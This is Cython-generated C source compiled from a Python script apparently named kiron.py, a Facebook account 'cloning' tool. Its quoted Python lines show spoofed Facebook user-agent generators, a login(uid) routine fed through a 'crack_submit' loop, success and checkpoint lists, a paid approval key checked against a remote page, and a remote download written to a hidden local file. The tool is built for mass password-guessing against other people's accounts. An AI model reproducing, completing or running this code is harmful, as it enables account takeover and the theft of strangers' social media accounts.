  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Y, __pyx_kp_s_1_33m) < 0) __PYX_ERR(0, 128, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_G, __pyx_kp_s_38_5_46m) < 0) __PYX_ERR(0, 128, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_B, __pyx_kp_s_38_5_8m) < 0) __PYX_ERR(0, 128, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_G1, __pyx_kp_s_38_5_48m) < 0) __PYX_ERR(0, 128, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_G2, __pyx_kp_s_38_5_47m) < 0) __PYX_ERR(0, 128, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_G3, __pyx_kp_s_38_5_48m) < 0) __PYX_ERR(0, 128, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_G4, __pyx_kp_s_38_5_49m) < 0) __PYX_ERR(0, 128, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_G5, __pyx_kp_s_38_5_50m) < 0) __PYX_ERR(0, 128, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_X, __pyx_kp_s_1_34m) < 0) __PYX_ERR(0, 128, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_X1, __pyx_kp_s_38_5_14m) < 0) __PYX_ERR(0, 128, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_X2, __pyx_kp_s_38_5_123m) < 0) __PYX_ERR(0, 128, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_X3, __pyx_kp_s_38_5_122m) < 0) __PYX_ERR(0, 128, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_X4, __pyx_kp_s_38_5_86m) < 0) __PYX_ERR(0, 128, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_X5, __pyx_kp_s_38_5_121m) < 0) __PYX_ERR(0, 128, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_S, __pyx_kp_s_1_96m) < 0) __PYX_ERR(0, 128, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_M, __pyx_kp_s_38_5_205m) < 0) __PYX_ERR(0, 128, __pyx_L1_error)

  /* "kiron.py":130
 * A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
 * #__________________| LINE |__________________#
 * def clear():os.system('clear');print(logo)             # <<<<<<<<<<<<<<
 * def linex():print(f'\x1b[1;97m\033[1;37m')
 * #__________________[ M1 ]__________________#
 */
  __pyx_t_3 = __Pyx_CyFunction_New(&__pyx_mdef_5kiron_3clear, 0, __pyx_n_s_clear, NULL, __pyx_n_s_kiron, __pyx_d, ((PyObject *)__pyx_codeobj__131)); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 130, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_clear, __pyx_t_3) < 0) __PYX_ERR(0, 130, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "kiron.py":131
 * #__________________| LINE |__________________#
 * def clear():os.system('clear');print(logo)
 * def linex():print(f'\x1b[1;97m\033[1;37m')             # <<<<<<<<<<<<<<
 * #__________________[ M1 ]__________________#
 * def AYYUB_M1():
 */
  __pyx_t_3 = __Pyx_CyFunction_New(&__pyx_mdef_5kiron_5linex, 0, __pyx_n_s_linex, NULL, __pyx_n_s_kiron, __pyx_d, ((PyObject *)__pyx_codeobj__132)); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 131, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_linex, __pyx_t_3) < 0) __PYX_ERR(0, 131, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "kiron.py":133
 * def linex():print(f'\x1b[1;97m\033[1;37m')
 * #__________________[ M1 ]__________________#
 * def AYYUB_M1():             # <<<<<<<<<<<<<<
 *         ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Robi;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M1803E1A;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
 *         return ua
 */
  __pyx_t_3 = __Pyx_CyFunction_New(&__pyx_mdef_5kiron_7AYYUB_M1, 0, __pyx_n_s_AYYUB_M1, NULL, __pyx_n_s_kiron, __pyx_d, ((PyObject *)__pyx_codeobj__134)); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 133, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_AYYUB_M1, __pyx_t_3) < 0) __PYX_ERR(0, 133, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "kiron.py":137
 *         return ua
 * #__________________[ M2 ]__________________#
 * def AYYUB_M2():             # <<<<<<<<<<<<<<
 *         ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Robi;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ZS630KL;FBSV/9;nullFBCA/armeabi-v7a:armeabi;]"
 *         return ua
 */
  __pyx_t_3 = __Pyx_CyFunction_New(&__pyx_mdef_5kiron_9AYYUB_M2, 0, __pyx_n_s_AYYUB_M2, NULL, __pyx_n_s_kiron, __pyx_d, ((PyObject *)__pyx_codeobj__135)); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 137, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_AYYUB_M2, __pyx_t_3) < 0) __PYX_ERR(0, 137, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "kiron.py":142
 * #-----------------------[ UA-CODE ]-----------------------#
 * #old ua def[]
 * def windows():             # <<<<<<<<<<<<<<
 *     aV=str(random.choice(range(10,20)))
 *     A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
 */
  __pyx_t_3 = __Pyx_CyFunction_New(&__pyx_mdef_5kiron_11windows, 0, __pyx_n_s_windows, NULL, __pyx_n_s_kiron, __pyx_d, ((PyObject *)__pyx_codeobj__137)); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 142, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_windows, __pyx_t_3) < 0) __PYX_ERR(0, 142, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "kiron.py":156
 *     return random.choice([A,B,C,D])
 * #-------------------// APPROVAL \\---------------------#
 * import os,httpx             # <<<<<<<<<<<<<<
 * sexkey = "XD~["+str(os.getuid())+"4YYU8"+str(os.getuid())+"]~XD"
 * def approval():
 */
  __pyx_t_3 = __Pyx_ImportDottedModule(__pyx_n_s_os, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 156, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_os, __pyx_t_3) < 0) __PYX_ERR(0, 156, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_ImportDottedModule(__pyx_n_s_httpx, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 156, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_httpx, __pyx_t_3) < 0) __PYX_ERR(0, 156, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "kiron.py":157
 * #-------------------// APPROVAL \\---------------------#
 * import os,httpx
 * sexkey = "XD~["+str(os.getuid())+"4YYU8"+str(os.getuid())+"]~XD"             # <<<<<<<<<<<<<<
 * def approval():
 *     sexkey = "XD~["+str(os.getuid())+"4YYU8"+str(os.getuid())+"]~XD"
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_os); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 157, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_getuid); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 157, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_CallNoArg(__pyx_t_8); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 157, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_8 = __Pyx_PyObject_Str(__pyx_t_3); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 157, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyNumber_Add(__pyx_kp_s_XD, __pyx_t_8); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 157, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_8 = PyNumber_Add(__pyx_t_3, __pyx_kp_s_4YYU8); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 157, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_os); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 157, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_getuid); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 157, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_CallNoArg(__pyx_t_7); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 157, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyObject_Str(__pyx_t_3); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 157, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyNumber_Add(__pyx_t_8, __pyx_t_7); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 157, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = PyNumber_Add(__pyx_t_3, __pyx_kp_s_XD_2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 157, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_sexkey, __pyx_t_7) < 0) __PYX_ERR(0, 157, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

  /* "kiron.py":158
 * import os,httpx
 * sexkey = "XD~["+str(os.getuid())+"4YYU8"+str(os.getuid())+"]~XD"
 * def approval():             # <<<<<<<<<<<<<<
 *     sexkey = "XD~["+str(os.getuid())+"4YYU8"+str(os.getuid())+"]~XD"
 *     ress=httpx.get("https://fgsrsvb.blogspot.com/2024/05/approvetxt.html").text
 */
  __pyx_t_7 = __Pyx_CyFunction_New(&__pyx_mdef_5kiron_13approval, 0, __pyx_n_s_approval, NULL, __pyx_n_s_kiron, __pyx_d, ((PyObject *)__pyx_codeobj__139)); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 158, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_approval, __pyx_t_7) < 0) __PYX_ERR(0, 158, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

  /* "kiron.py":174
 *         os.system('xdg-open https://wa.me/+8801909765573')
 * #__________________| LOGO |__________________#
 * logo=(f"""             # <<<<<<<<<<<<<<
 * \x1b[1;97m \x1b[1;91m>\x1b[1;92m>\x1b[1;93m>\x1b[38;5;46m\x1b[38;5;46mTOOLS TYPE\x1b[1;91m<\x1b[1;92m<\x1b[1;93m<\x1b[1;97m
 *      \x1b[38;5;46mFILE\x1b[1;97m\x1b[38;5;46mRANDOM\x1b[1;97m\x1b[38;5;46mOLD CLONING\x1b[1;97m (\x1b[1;91mFREE\x1b[1;97m) \x1b[1;91m   \x1b[1;92m  \x1b[1;93m     \x1b[1;97m
 */
  __pyx_t_7 = PyTuple_New(3); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 174, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_12 = 0;
  __pyx_t_13 = 127;
  __Pyx_INCREF(__pyx_kp_u_1_97m_1_91m_1_92m_1_93m_38_5_46);
  __pyx_t_13 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_kp_u_1_97m_1_91m_1_92m_1_93m_38_5_46) > __pyx_t_13) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_kp_u_1_97m_1_91m_1_92m_1_93m_38_5_46) : __pyx_t_13;
  __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_kp_u_1_97m_1_91m_1_92m_1_93m_38_5_46);
  __Pyx_GIVEREF(__pyx_kp_u_1_97m_1_91m_1_92m_1_93m_38_5_46);
  PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_kp_u_1_97m_1_91m_1_92m_1_93m_38_5_46);
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_sexkey); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 174, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_8 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 174, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_13 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) > __pyx_t_13) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) : __pyx_t_13;
  __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_8);
  __Pyx_GIVEREF(__pyx_t_8);
  PyTuple_SET_ITEM(__pyx_t_7, 1, __pyx_t_8);
  __pyx_t_8 = 0;
  __Pyx_INCREF(__pyx_kp_u_1_97m_2);
  __pyx_t_13 = (65535 > __pyx_t_13) ? 65535 : __pyx_t_13;
  __pyx_t_12 += 72;
  __Pyx_GIVEREF(__pyx_kp_u_1_97m_2);
  PyTuple_SET_ITEM(__pyx_t_7, 2, __pyx_kp_u_1_97m_2);
  __pyx_t_8 = __Pyx_PyUnicode_Join(__pyx_t_7, 3, __pyx_t_12, __pyx_t_13); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 174, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_logo, __pyx_t_8) < 0) __PYX_ERR(0, 174, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

  /* "kiron.py":187
 * """)
 * #-----------------------[ OLD-CODE ]-----------------------#
 * def _old_():             # <<<<<<<<<<<<<<
 *        user=[]
 *        clear()
 */
  __pyx_t_8 = __Pyx_CyFunction_New(&__pyx_mdef_5kiron_15_old_, 0, __pyx_n_s_old, NULL, __pyx_n_s_kiron, __pyx_d, ((PyObject *)__pyx_codeobj__141)); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 187, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_old, __pyx_t_8) < 0) __PYX_ERR(0, 187, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

  /* "kiron.py":216
 *               crack_submit.submit(login,uid)
 * 
 * loop=0             # <<<<<<<<<<<<<<
 * oks=[]
 * cps=[]
 */
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_loop, __pyx_int_0) < 0) __PYX_ERR(0, 216, __pyx_L1_error)

  /* "kiron.py":217
 * 
 * loop=0
 * oks=[]             # <<<<<<<<<<<<<<
 * cps=[]
 * 
 */
  __pyx_t_8 = PyList_New(0); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 217, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_oks, __pyx_t_8) < 0) __PYX_ERR(0, 217, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

  /* "kiron.py":218
 * loop=0
 * oks=[]
 * cps=[]             # <<<<<<<<<<<<<<
 * 
 * def login(uid):
 */
  __pyx_t_8 = PyList_New(0); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 218, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_cps, __pyx_t_8) < 0) __PYX_ERR(0, 218, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

  /* "kiron.py":220
 * cps=[]
 * 
 * def login(uid):             # <<<<<<<<<<<<<<
 *     global oks,loop
 *     Session=requests.session()
 */
  __pyx_t_8 = __Pyx_CyFunction_New(&__pyx_mdef_5kiron_17login, 0, __pyx_n_s_login, NULL, __pyx_n_s_kiron, __pyx_d, ((PyObject *)__pyx_codeobj__143)); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 220, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_login, __pyx_t_8) < 0) __PYX_ERR(0, 220, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

  /* "kiron.py":256
 *     except:pass
 * #__________________| MAIN |__________________#
 * def menu():             # <<<<<<<<<<<<<<
 *         try:
 *                         clear()
 */
  __pyx_t_8 = __Pyx_CyFunction_New(&__pyx_mdef_5kiron_19menu, 0, __pyx_n_s_menu, NULL, __pyx_n_s_kiron, __pyx_d, ((PyObject *)__pyx_codeobj__145)); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 256, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_menu, __pyx_t_8) < 0) __PYX_ERR(0, 256, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

  /* "kiron.py":331
 *                 exit()
 * #__________________[ RANDOM ]__________________#
 * resrr = requests.get('https://raw.githubusercontent.com/SHISHIR-143/R/main/mix.txt').text             # <<<<<<<<<<<<<<
 * #resrr=open('/storage/emulated/0/mix.txt','r').read()
 * open('.mod.txt','w').write(resrr)
 */
  __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_requests); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 331, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_get); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 331, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_tuple__146, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 331, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_text); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 331, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_resrr, __pyx_t_7) < 0) __PYX_ERR(0, 331, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

  /* "kiron.py":333
 * resrr = requests.get('https://raw.githubusercontent.com/SHISHIR-143/R/main/mix.txt').text
 * #resrr=open('/storage/emulated/0/mix.txt','r').read()
 * open('.mod.txt','w').write(resrr)             # <<<<<<<<<<<<<<
 * moe = open('.mod.txt','r').read().splitlines()
 * def usergent():
 */
  __pyx_t_7 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__147, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 333, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_write); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 333, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_resrr); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 333, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_7); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 333, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "kiron.py":334
 * #resrr=open('/storage/emulated/0/mix.txt','r').read()
 * open('.mod.txt','w').write(resrr)
 * moe = open('.mod.txt','r').read().splitlines()             # <<<<<<<<<<<<<<
 * def usergent():
 *      motorola= random.choice(['M Bot 54', 'M Bot 60', 'M1', 'M3', 'M3s', 'M5 Lite', 'M6 Note', 'Magic', 'Maimang 5', 'Mate 10 Lite Dual SIM', 'Mate 20 X (China)', 'Mate 8', 'MB526', 'Medias X', 'MI 2', 'MI 3W', 'Mi 4 LTE', 'MI 4i', 'MI 5', 'MI 5X', 'Mi A1', 'Mi Max', 'Mi Max 2', 'Mi Mix 2', 'Milestone', 'Miracle', 'Moment (Sprint)', 'Monza', 'Motion Plus', 'Moto C', 'Moto E2 (4G LTE)', 'Moto E3 Power', 'Moto E4', 'Moto E4 Plus', 'Moto E5', 'Moto E5 Plus', 'Moto G', 'Moto G 2nd Gen', 'Moto G Play', 'Moto G3', 'Moto G3 Turbo Edition', 'Moto G4', 'Moto G5 Plus', 'Moto G5s', 'Moto G5s Plus', 'Moto G6', 'Moto X', 'Moto X 2nd Gen (AT&T)', 'Moto Z', 'Multipad 2 Ultra Duo 8.0 3G', 'MultiPhone 3350 Duo', 'MultiPhone 4044 Duo', 'MultiPhone 5504 DUO', 'Multiphone 7600 Duo', 'MX2', 'MX380', 'MX5'])
 */
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__148, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 334, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_read); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 334, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_CallNoArg(__pyx_t_7); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 334, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_splitlines); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 334, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_CallNoArg(__pyx_t_7); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 334, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_moe, __pyx_t_3) < 0) __PYX_ERR(0, 334, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "kiron.py":335
 * open('.mod.txt','w').write(resrr)
 * moe = open('.mod.txt','r').read().splitlines()
 * def usergent():             # <<<<<<<<<<<<<<
 *      motorola= random.choice(['M Bot 54', 'M Bot 60', 'M1', 'M3', 'M3s', 'M5 Lite', 'M6 Note', 'Magic', 'Maimang 5', 'Mate 10 Lite Dual SIM', 'Mate 20 X (China)', 'Mate 8', 'MB526', 'Medias X', 'MI 2', 'MI 3W', 'Mi 4 LTE', 'MI 4i', 'MI 5', 'MI 5X', 'Mi A1', 'Mi Max', 'Mi Max 2', 'Mi Mix 2', 'Milestone', 'Miracle', 'Moment (Sprint)', 'Monza', 'Motion Plus', 'Moto C', 'Moto E2 (4G LTE)', 'Moto E3 Power', 'Moto E4', 'Moto E4 Plus', 'Moto E5', 'Moto E5 Plus', 'Moto G', 'Moto G 2nd Gen', 'Moto G Play', 'Moto G3', 'Moto G3 Turbo Edition', 'Moto G4', 'Moto G5 Plus', 'Moto G5s', 'Moto G5s Plus', 'Moto G6', 'Moto X', 'Moto X 2nd Gen (AT&T)', 'Moto Z', 'Multipad 2 Ultra Duo 8.0 3G', 'MultiPhone 3350 Duo', 'MultiPhone 4044 Duo', 'MultiPhone 5504 DUO', 'Multiphone 7600 Duo', 'MX2', 'MX380', 'MX5'])
 *      mmp = random.choice(['13 Pro','Black Shark','Black Shark 2','Black Shark 3','Black Shark 3S','Black Shark 4','Black Shark 4 Pro','Black Shark 5','Black Shark 5 Pro','Black Shark Helo','Civi','Civi 2','Hongmi','Hongmi 1S','Hongmi 2','Hongmi 2 3G','Hongmi 2 4G','Hongmi 4G','Hongmi Note 1TD','Mi Box 4','Mi Cancro','Mi CC 9','Mi CC 9 Pro','Mi CC 9e','Mi CC9','Mi Laser Projector 150','Mi Max','Mi Max 2','Mi Max 3','Mi MAX2','Mi Max3','Mi Mix','Mi Mix 2','Mi Mix 2S','Mi Mix 3','Mi Mix 3 5G','Mi Mix 4','Mi Mix Fold','Mi Note 10','Mi Note 10 Lite','Mi Note 10 Pro','Mi Note 11','Mi Note 2','Mi Note 3','Mi Note 8','Mi Note LTE','Mi Note Pro','Mi Note10','Mi Note5','Mi One','Mi One C1','Mi One Plus','Mi Pad','Mi Pad 2','Mi Pad 3','Mi Pad 4','Mi Pad 4 Plus','Mi Pad 5','Mi Pad 5 Pro','Mi Pad 5 Pro 5G','Mi Pad4','Mi Pad5','Mi Play','Mi XL','Mi5','MiTV 4A','MiTV 4A Pro','MiTV 4C','MiTV 4I','MiTV 4S','MiTV 4X','MiTV P1','MiTV Q1','MiTV Stick','MiTV Stick 4K','Mix Fold 2','MT6765 G Series','Note 12 Pro','Pad 6 Pro','Pocophone F1','Qin 1s+','Qin 2','Qin 2 Pro','Redmi 11','Redmi 12','Redmi 2','Redmi 3','Redmi 4','Redmi 5','Redmi 